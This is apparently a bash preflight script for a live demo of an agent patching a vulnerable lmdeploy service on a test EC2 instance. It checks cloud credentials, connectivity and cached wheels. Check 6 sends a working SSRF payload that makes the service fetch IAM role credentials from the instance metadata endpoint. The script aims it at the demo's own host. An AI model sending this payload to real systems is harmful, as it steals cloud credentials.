#!/usr/bin/env bash
# RunwayZero preflight — run 15 minutes before stage time.
# Exits non-zero on the first failed check so you cannot miss it.
set -uo pipefail

: "${RUNWAYZERO_TEST_EC2_INSTANCE_ID:?must be set}"
: "${RUNWAYZERO_TEST_EC2_HOST:?must be set}"
: "${RUNWAYZERO_TEST_EC2_ROLE_NAME:?must be set}"
: "${RUNWAYZERO_APP_MODULE_DIR:?must be set}"
: "${ANTHROPIC_API_KEY:?must be set}"
: "${CODECOMMIT_AWS_PROFILE:?must be set}"
: "${SSM_AWS_PROFILE:?must be set}"
: "${DEMO_APP_REPO:?must be set}"
REGION="${AWS_REGION:-ap-southeast-1}"
FAIL=0

ok() { echo -e "  \033[32mOK\033[0m   $1"; }
fail() { echo -e "  \033[31mFAIL\033[0m $1"; FAIL=1; }

echo "[preflight] 1/8 AWS credentials"
aws sts get-caller-identity --profile "$CODECOMMIT_AWS_PROFILE" --region "$REGION" >/dev/null 2>&1 \
  && ok "$CODECOMMIT_AWS_PROFILE profile valid" || fail "$CODECOMMIT_AWS_PROFILE profile not authenticated"
aws sts get-caller-identity --profile "$SSM_AWS_PROFILE" --region "$REGION" >/dev/null 2>&1 \
  && ok "$SSM_AWS_PROFILE profile valid" || fail "$SSM_AWS_PROFILE profile not authenticated"

echo "[preflight] 2/8 CodeCommit access to $DEMO_APP_REPO"
aws codecommit get-repository --profile "$CODECOMMIT_AWS_PROFILE" --region "$REGION" \
  --repository-name "$DEMO_APP_REPO" >/dev/null 2>&1 \
  && ok "$DEMO_APP_REPO repository readable" || fail "cannot read $DEMO_APP_REPO repo"

echo "[preflight] 3/8 Test EC2 instance reachable via SSM"
aws ssm describe-instance-information --profile "$SSM_AWS_PROFILE" --region "$REGION" \
  --filters "Key=InstanceIds,Values=${RUNWAYZERO_TEST_EC2_INSTANCE_ID}" \
  --query "InstanceInformationList[0].PingStatus" --output text 2>/dev/null \
  | grep -q Online \
  && ok "instance ${RUNWAYZERO_TEST_EC2_INSTANCE_ID} reports Online to SSM" \
  || fail "instance ${RUNWAYZERO_TEST_EC2_INSTANCE_ID} is not Online to SSM"

echo "[preflight] 4/8 SSH bastion tunnel up + service /healthz reachable"
# Access is via SSH tunnel: ssh -L 8080:<private-ip>:8080 <bastion> -N -f
# RUNWAYZERO_TEST_EC2_HOST should be localhost:8080 when tunnel is active.
curl --max-time 5 -s -o /dev/null -w "%{http_code}" "http://${RUNWAYZERO_TEST_EC2_HOST}/healthz" \
  | grep -q 200 \
  && ok "GET http://${RUNWAYZERO_TEST_EC2_HOST}/healthz returned 200 (tunnel is up)" \
  || fail "GET ${RUNWAYZERO_TEST_EC2_HOST}/healthz did not return 200 — is the bastion tunnel running? ssh -L 8080:<private-ip>:8080 <bastion> -N -f"

echo "[preflight] 5/8 Vulnerable lmdeploy 0.12.2 currently installed (starting state)"
HEALTHZ_VERSION=$(curl -s "http://${RUNWAYZERO_TEST_EC2_HOST}/healthz" | grep -o '"lmdeploy_version":"[^"]*"' | cut -d'"' -f4)
[ "$HEALTHZ_VERSION" = "0.12.2" ] \
  && ok "service reports lmdeploy 0.12.2" \
  || fail "service reports lmdeploy=${HEALTHZ_VERSION}, expected 0.12.2 — run scripts/reset-demo.sh"

echo "[preflight] 6/8 SSRF exploit currently succeeds (proves vulnerable + IMDSv1 + role name correct)"
EXPLOIT_BODY=$(curl --max-time 5 -s -X POST "http://${RUNWAYZERO_TEST_EC2_HOST}/chat" \
  -H "Content-Type: application/json" \
  -d "{\"image_url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/${RUNWAYZERO_TEST_EC2_ROLE_NAME}\"}")
echo "$EXPLOIT_BODY" | grep -q AccessKeyId \
  && ok "exploit returned AccessKeyId in response body" \
  || fail "exploit did NOT return AccessKeyId — IMDSv1 off, wrong role name, or service patched"

echo "[preflight] 7/8 Pre-cached wheels present on test-ec2"
WHEEL_CHECK=$(aws ssm send-command --profile "$SSM_AWS_PROFILE" --region "$REGION" \
  --instance-ids "$RUNWAYZERO_TEST_EC2_INSTANCE_ID" --document-name AWS-RunShellScript \
  --parameters 'commands=["ls /var/cache/runwayzero/wheels/ | grep -E \"lmdeploy-0.12.[23]\" | wc -l"]' \
  --query "Command.CommandId" --output text 2>/dev/null)
sleep 5
WHEEL_OUT=$(aws ssm get-command-invocation --profile "$SSM_AWS_PROFILE" --region "$REGION" \
  --command-id "$WHEEL_CHECK" --instance-id "$RUNWAYZERO_TEST_EC2_INSTANCE_ID" \
  --query "StandardOutputContent" --output text 2>/dev/null | tr -d '[:space:]')
[ "$WHEEL_OUT" = "2" ] \
  && ok "both 0.12.2 and 0.12.3 wheels present in /var/cache/runwayzero/wheels" \
  || fail "wheel cache count = $WHEEL_OUT, expected 2 — re-run ansible Phase A4"

echo "[preflight] 8/8 Genspark cache file present"
CACHE_FILE="${RUNWAYZERO_CACHE_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/runwayzero_agent/cache}/genspark-CVE-2026-33626.json"
[ -f "$CACHE_FILE" ] \
  && ok "Genspark cache file exists" \
  || fail "Genspark cache file missing — agent will fail if Genspark API is also down"

echo ""
if [ $FAIL -eq 0 ]; then
  echo -e "\033[32m[preflight] ALL CHECKS PASSED — clear for stage.\033[0m"
  exit 0
else
  echo -e "\033[31m[preflight] FAILED — DO NOT START LIVE DEMO. Resolve and rerun.\033[0m"
  exit 1
fi
